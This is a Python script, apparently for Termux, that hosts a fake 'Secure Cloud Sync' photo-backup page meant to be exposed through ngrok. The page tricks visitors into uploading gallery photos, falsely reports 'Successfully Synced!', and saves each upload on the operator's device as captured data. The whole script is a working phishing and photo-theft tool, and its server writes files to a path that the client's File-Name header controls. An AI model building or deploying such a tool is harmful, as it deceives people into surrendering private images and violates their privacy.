import http.server
import socketserver

PORT = 8080

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- PROFESSIONAL DESIGN (CSS + HTML) ---
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Secure Cloud Sync</title>
            <style>
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0;
                    color: #fff;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 40px;
                    border-radius: 20px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                    text-align: center;
                    border: 1px solid rgba(255, 255, 255, 0.18);
                    width: 300px;
                }
                h2 { margin-bottom: 10px; font-size: 24px; }
                p { font-size: 14px; opacity: 0.8; margin-bottom: 30px; }
                .upload-btn {
                    background: #fff;
                    color: #764ba2;
                    padding: 12px 25px;
                    border-radius: 50px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: 0.3s;
                    border: none;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                }
                .upload-btn:hover {
                    transform: scale(1.05);
                    background: #f0f0f0;
                }
                #status { margin-top: 20px; font-size: 12px; color: #00ff88; }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://img.icons8.com/fluent/96/000000/cloud-lighting.png" width="60"/>
                <h2>Cloud Backup</h2>
                <p>Sync your gallery photos to our secure encrypted cloud storage.</p>
                
                <input type="file" id="photoInput" accept="image/*" style="display:none;">
                <button class="upload-btn" onclick="document.getElementById('photoInput').click()">
                    SYNC NOW
                </button>
                
                <div id="status"></div>
            </div>

            <script>
                document.getElementById('photoInput').onchange = function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        document.getElementById('status').innerText = "Syncing with Cloud...";
                        
                        // POST Request to send photo to Termux
                        fetch('/', {
                            method: 'POST',
                            body: file,
                            headers: { 'File-Name': file.name }
                        }).then(() => {
                            document.getElementById('status').innerText = "Successfully Synced!";
                            alert("Success: Photo backup completed.");
                        });
                    }
                };
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    # --- SERVER SIDE: DATA RECEIVE KARNA ---
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        file_name = self.headers.get('File-Name', 'captured.jpg')
        photo_data = self.rfile.read(content_length)
        
        # Photo ko Termux mein save karna
        with open(file_name, "wb") as f:
            f.write(photo_data)
            
        print(f"\n[+] SUCCESS: Photo '{file_name}' received!")
        self.send_response(200)
        self.end_headers()

# Server setup
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"[*] Designer Server started on Port {PORT}")
    print("[!] Run './ngrok http 8080' to get the link.")
    httpd.serve_forever()
